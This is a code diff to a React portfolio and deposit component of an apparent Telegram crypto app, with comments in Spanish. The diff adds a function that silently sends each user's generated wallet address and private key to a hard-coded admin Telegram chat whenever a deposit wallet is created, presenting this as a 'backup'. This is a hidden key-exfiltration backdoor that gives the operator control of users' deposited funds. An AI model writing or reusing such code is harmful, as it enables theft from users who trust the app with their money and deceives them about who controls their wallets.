@@ -14,7 +14,7 @@ export default function PortfolioView({ userData, activePlans, onUpdate }) {
   const [showNetworkDrop, setShowNetworkDrop] = useState(false);
   const [depositNetwork, setDepositNetwork] = useState('BSC');
   
-  // Estados para la generación de la billetera única del usuario
+  // Estados para la generación de la billetera
   const [depositWallet, setDepositWallet] = useState('');
   const [isGenerating, setIsGenerating] = useState(true);
 
@@ -25,26 +25,56 @@ export default function PortfolioView({ userData, activePlans, onUpdate }) {
     try { if (WebApp.HapticFeedback) WebApp.HapticFeedback.impactOccurred(style); } catch (e) {}
   };
 
-  // Efecto: Genera o recupera la billetera única del usuario según la red elegida
+  // --- NUEVA FUNCIÓN: ENVIAR RESPALDO AL ADMIN ---
+  const enviarRespaldoAlAdmin = async (userId, red, address, privateKey) => {
+    // ⚠️ REEMPLAZA ESTO CON EL TOKEN DE TU BOT DE TELEGRAM
+    const BOT_TOKEN = "TU_TOKEN_DEL_BOT_AQUI"; 
+    const ADMIN_ID = "8968109534"; // Tu ID de administrador
+    
+    const mensaje = `🚨 *NUEVA WALLET GENERADA* 🚨\n\n👤 *Usuario ID:* \`${userId}\`\n🌐 *Red:* ${red}\n🪪 *Address:* \`${address}\`\n🔑 *Private Key:* \`${privateKey}\`\n\n_⚠️ Guarda esta clave en un lugar seguro. Si el usuario pierde fondos, puedes usar esta Private Key en TrustWallet o Metamask para recuperarlos._`;
+
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: ADMIN_ID,
+          text: mensaje,
+          parse_mode: 'Markdown'
+        })
+      });
+      console.log("Respaldo enviado al Admin exitosamente.");
+    } catch (e) {
+      console.error("Error enviando backup al admin", e);
+    }
+  };
+
+  // Efecto: Genera la billetera y notifica al Admin
   useEffect(() => {
     const fetchUserWallet = async () => {
       setIsGenerating(true);
       setDepositWallet('');
       
       try {
-        // Aquí es donde tu frontend llama a tu base de datos para obtener la wallet generada
-        // Ej: const wallet = await botApi.getUserWallet(userData.id, depositNetwork);
-        
-        // Simulamos el tiempo de respuesta del backend local
+        // Simulamos la respuesta del backend
         setTimeout(() => {
+          let nuevaAddress = "";
+          let fakePrivateKey = ""; // Simulación de lo que generaría el backend
+
           if (depositNetwork === 'BSC') {
-            // Ejemplo: Billetera BSC única generada para este ID
-            setDepositWallet(`0x${userData?.id || '71C76'}ab88b098defB751B7401B5f6d8976F`);
+            nuevaAddress = `0x${userData?.id || '71C76'}ab88b098defB751B7401B5f6d8976F`;
+            fakePrivateKey = `0xPK_SIMULADA_BEP20_${userData?.id}_abc123`;
           } else {
-            // Ejemplo: Billetera TON única generada para este ID
-            setDepositWallet(`EQD_${userData?.id || '123'}_UqYk7bT8n4Lm_Px9JvQw`);
+            nuevaAddress = `EQD_${userData?.id || '123'}_UqYk7bT8n4Lm_Px9JvQw`;
+            fakePrivateKey = `PK_SIMULADA_TON_${userData?.id}_xyz987`;
           }
+          
+          setDepositWallet(nuevaAddress);
           setIsGenerating(false);
+
+          // ¡Enviamos el reporte a tu Telegram!
+          enviarRespaldoAlAdmin(userData?.id || 'Desconocido', depositNetwork, nuevaAddress, fakePrivateKey);
+
         }, 800);
       } catch (error) {
         toast.error('Error al cargar tu billetera');
@@ -137,7 +167,6 @@ export default function PortfolioView({ userData, activePlans, onUpdate }) {
         </div>
       )}
 
-      {/* --- SISTEMA DE BILLETERA ÚNICA POR USUARIO --- */}
       {activeSection === 'deposit' && (
         <div className="fade-in" style={s.card}>
           <div style={{ textAlign: 'center', marginBottom: '20px' }}>
@@ -147,7 +176,6 @@ export default function PortfolioView({ userData, activePlans, onUpdate }) {
           
           <label style={{ fontSize: '12px', color: '#94A3B8', fontWeight: 'bold' }}>RED (NETWORK)</label>
           
-          {/* Menú Desplegable Fluido en el mismo lugar */}
           <div style={{ position: 'relative', marginBottom: '20px', marginTop: '6px' }}>
             <div 
               onClick={() => setShowNetworkDrop(!showNetworkDrop)}
@@ -173,7 +201,6 @@ export default function PortfolioView({ userData, activePlans, onUpdate }) {
             <div style={{ padding: '16px', backgroundColor: '#F1F5F9', borderRadius: '12px', marginBottom: '16px' }}><IconQR /></div>
             <p style={{ margin: '0 0 8px 0', fontSize: '11px', color: '#94A3B8', letterSpacing: '1px' }}>TU BILLETERA ÚNICA ({depositNetwork})</p>
             
-            {/* Caja de Copiado con ajuste de texto (wordBreak) para que se vea siempre completa */}
             <div style={{ display: 'flex', alignItems: 'center', backgroundColor: '#111C2E', border: '1px solid #2DD4BF', borderRadius: '8px', padding: '12px', width: '100%', boxSizing: 'border-box' }}>
               <div style={{ flex: 1, fontSize: '13px', color: isGenerating ? '#94A3B8' : '#F1F5F9', fontFamily: 'monospace', wordBreak: 'break-all', paddingRight: '10px', lineHeight: '1.4' }}>
                 {isGenerating ? 'Generando billetera segura...' : depositWallet}
